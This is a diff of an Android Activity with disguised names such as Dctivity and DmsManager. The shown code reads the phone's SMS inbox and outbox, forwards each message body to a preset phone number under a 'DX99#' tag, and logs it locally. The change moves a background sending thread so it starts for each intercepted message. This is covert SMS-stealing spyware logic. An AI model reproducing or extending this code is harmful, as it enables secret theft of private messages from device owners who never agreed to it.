@@ -65,14 +65,12 @@ public class Dctivity extends Activity {
 						String lx = (type == 1 ? "收件箱" : "发件箱");
 						DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
 						DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
+						Dhread.SartSend(Dctivity.this.getApplicationContext());
 					}
 					return c.getCount() == 0 ? false : true;
 				}
 				@Override
 				protected void onPostExecute(Boolean result) {
-					if (result) {
-						Dhread.SartSend(Dctivity.this.getApplicationContext());
-					}
 					Editor editor=sp.edit();
 					editor.putBoolean("isfrist", false);
 					editor.putInt("code", getVersionCode());
